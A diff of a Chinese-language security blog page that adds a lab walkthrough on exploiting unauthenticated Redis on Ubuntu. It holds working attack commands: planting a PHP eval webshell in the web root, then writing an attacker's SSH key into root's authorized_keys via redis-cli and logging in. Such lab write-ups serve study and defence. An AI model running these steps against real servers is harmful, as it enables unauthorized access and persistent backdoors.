@@ -102,7 +102,17 @@
 <meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180819/fClIhiBE92.png?imageslim">
 <meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180819/IBEEbfgDJj.png?imageslim">
 <meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180820/eke56eebcF.png?imageslim">
-<meta property="og:updated_time" content="2018-08-19T17:03:28.593Z">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180822/68m41gGBdj.png?imageslim">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180822/Di4g4GhlKE.png?imageslim">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180822/3fdg73Gl2F.png?imageslim">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180819/D5KF0LHCbI.png?imageslim">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180819/hBIBd9J9kf.png?imageslim">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180819/HGJfgl2HGf.png?imageslim">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180822/hC3l8d6iak.png?imageslim">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180822/g09I15ABF0.png?imageslim">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180822/8gBjG01E3f.png?imageslim">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180822/LHC200k4jh.png?imageslim">
+<meta property="og:updated_time" content="2018-08-22T09:40:14.936Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="记一次失败漏洞利用的经历--ubuntu下的redis未授权访问漏洞复现">
 <meta name="twitter:description" content="记一次失败漏洞利用的经历–ubuntu下的redis未授权访问漏洞复现由于redis的配置不当导致攻击者可以利用该未授权访问漏洞去对服务器进行攻击，redis服务默认端口为6379端口，在利用该漏洞的时候，由于服务器是ubuntu的原因，遇到了不少坑导致最终并没有利用成功，不像之前在centos环境下利用该漏洞时那样顺利，所以在这里记录一下。在理解这篇文章之前，可以先参考一下之前的解决ubuntu">
@@ -404,10 +414,31 @@ command: 需要执行的命令
 <h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><p><strong>既然在ubuntu下写任务计划反弹shell这种方法不可行是因为ubuntu cron的原因，那么还是可以尝试其它的一些方式去利用该redis未授权访问漏洞的，比如利用redis写webshell或者向服务器写入ssh公钥去远程登陆，下面来说一下ubuntu环境下的redis未授权访问漏洞的另外两种利用手法</strong></p>
 <h3 id="利用redis未授权访问写webshell"><a href="#利用redis未授权访问写webshell" class="headerlink" title="利用redis未授权访问写webshell"></a>利用redis未授权访问写webshell</h3><p><strong>通过redis未授权访问漏洞向ubuntu的web跟目录下写入一个webshell，然后要知道网站的根目录，在该测试环境下网站的根目录为<code>/var/www/html</code>,在kali的redis-cli的交互式shell下执行</strong></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">set</span> aaa <span class="string">"\n\n\&lt;?php @eval(<span class="variable">$_POST</span>['c1imber']);?&gt;\n\n"</span></div><div class="line">config <span class="built_in">set</span> dir /var/www/html</div><div class="line">config <span class="built_in">set</span> dbfilename shell.php</div><div class="line">save</div></pre></td></tr></table></figure>
-<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/iJLjC1JD7B.png?imageslim" alt="mark"><br><strong>执行成功后可以看到在ubuntu的网站跟目录下成功写入了一个webshell,主要ubuntu默认安装的是php7，如果想让php解析，需要</strong></p>
+<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/iJLjC1JD7B.png?imageslim" alt="mark"><br><strong>执行成功后可以看到在ubuntu的网站跟目录下成功写入了一个webshell,如果想让php解析，需要安装<code>libapache2-mod-php</code>这个扩展</strong></p>
 <pre><code>sudo apt-get install libapache2-mod-php
 </code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/fClIhiBE92.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/IBEEbfgDJj.png?imageslim" alt="mark"></p>
 <p><img src="http://p008biu9n.bkt.clouddn.com/blog/180820/eke56eebcF.png?imageslim" alt="mark"></p>
+<h3 id="利用redis未授权访问向远程服务器写入ssh公钥"><a href="#利用redis未授权访问向远程服务器写入ssh公钥" class="headerlink" title="利用redis未授权访问向远程服务器写入ssh公钥"></a>利用redis未授权访问向远程服务器写入ssh公钥</h3><p><strong>ubuntu想要ssh远程登陆，首先需要安装openssh-server</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apt-get install openssh-server</div></pre></td></tr></table></figure>
+<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180822/68m41gGBdj.png?imageslim" alt="mark"><br><strong>然后需要ubuntu开放22端口允许ssh远程登陆并且开启密钥登陆，这里要修改ubuntu的<code>openssh-server</code>的配置文件<code>/etc/ssh/sshd_config</code>里的几个地方</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180822/Di4g4GhlKE.png?imageslim" alt="mark"></p>
+<p><strong>其中<code>RhostsRSAAuthentication yes</code>代表允许远程RSA认证登陆，也就是密钥登陆，<code>AuthorizedKeysFile %h/.ssh/authorized_keys</code>代表服务器公钥的存放位置，也是要利用redis未授权访问漏洞写入公钥文件的位置</strong></p>
+<p><strong>修改完成后重启ssh服务</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">service ssh restart</div></pre></td></tr></table></figure>
+<p><strong>之后在ubuntu的root目录下新建一个名为<code>.ssh</code>的目录</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> /root</div><div class="line">mkdir .ssh</div></pre></td></tr></table></figure>
+<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180822/3fdg73Gl2F.png?imageslim" alt="mark"></p>
+<p><strong>接下来使用kali在本地生成一对密钥</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh-keygen -t rsa</div></pre></td></tr></table></figure>
+<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/D5KF0LHCbI.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/hBIBd9J9kf.png?imageslim" alt="mark"><br><strong>之后将公钥<code>id_rsa.pub</code>写入到一个文件内</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(<span class="built_in">echo</span> -e <span class="string">"\n\n"</span>;cat id_rsa.pub;<span class="built_in">echo</span> -e <span class="string">"\n\n"</span>)&gt;key.txt</div></pre></td></tr></table></figure>
+<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/HGJfgl2HGf.png?imageslim" alt="mark"><br><strong>之后利用redis未授权访问漏洞将公钥写到centos的<code>/root/.ssh/id_rsa</code>文件中，首先</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat /root/.ssh/key.txt | ./src/redis-cli -h 192.168.0.107 -x <span class="built_in">set</span> aaa</div></pre></td></tr></table></figure>
+<p><strong>将刚刚生成的公钥设置给redis里的变量aaa</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180822/hC3l8d6iak.png?imageslim" alt="mark"><br><strong>接下来在kali的redis-cli的交互式shell下执行</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">config <span class="built_in">set</span> dir /root/.ssh</div><div class="line">config <span class="built_in">set</span> dbfilename authorized_keys</div><div class="line">save</div></pre></td></tr></table></figure>
+<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180822/g09I15ABF0.png?imageslim" alt="mark"></p>
+<p><strong>执行完毕后会在ubuntu服务器的<code>/root/.ssh</code>目录下生成一个<code>authorized_keys</code>的公钥文件，利用这个公钥文件就可以远程连接这台ubuntu了</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180822/8gBjG01E3f.png?imageslim" alt="mark"></p>
+<p><strong>ssh远程连接</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh 192.168.0.107</div></pre></td></tr></table></figure></p>
+<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180822/LHC200k4jh.png?imageslim" alt="mark"></p>
 
       
     </div>
@@ -614,7 +645,7 @@ command: 需要执行的命令
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#记一次失败漏洞利用的经历–ubuntu下的redis未授权访问漏洞复现"><span class="nav-number">1.</span> <span class="nav-text">记一次失败漏洞利用的经历–ubuntu下的redis未授权访问漏洞复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞环境及搭建"><span class="nav-number">1.0.1.</span> <span class="nav-text">漏洞环境及搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#尝试利用linux任务计划文件去反弹shell"><span class="nav-number">1.0.2.</span> <span class="nav-text">尝试利用linux任务计划文件去反弹shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#对于这一次失败的总结和看法"><span class="nav-number">1.0.3.</span> <span class="nav-text">对于这一次失败的总结和看法</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#补充"><span class="nav-number">2.</span> <span class="nav-text">补充</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#利用redis未授权访问写webshell"><span class="nav-number">2.0.1.</span> <span class="nav-text">利用redis未授权访问写webshell</span></a></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#记一次失败漏洞利用的经历–ubuntu下的redis未授权访问漏洞复现"><span class="nav-number">1.</span> <span class="nav-text">记一次失败漏洞利用的经历–ubuntu下的redis未授权访问漏洞复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞环境及搭建"><span class="nav-number">1.0.1.</span> <span class="nav-text">漏洞环境及搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#尝试利用linux任务计划文件去反弹shell"><span class="nav-number">1.0.2.</span> <span class="nav-text">尝试利用linux任务计划文件去反弹shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#对于这一次失败的总结和看法"><span class="nav-number">1.0.3.</span> <span class="nav-text">对于这一次失败的总结和看法</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#补充"><span class="nav-number">2.</span> <span class="nav-text">补充</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#利用redis未授权访问写webshell"><span class="nav-number">2.0.1.</span> <span class="nav-text">利用redis未授权访问写webshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用redis未授权访问向远程服务器写入ssh公钥"><span class="nav-number">2.0.2.</span> <span class="nav-text">利用redis未授权访问向远程服务器写入ssh公钥</span></a></li></ol></li></ol></li></ol></div>
             
 
           </div>
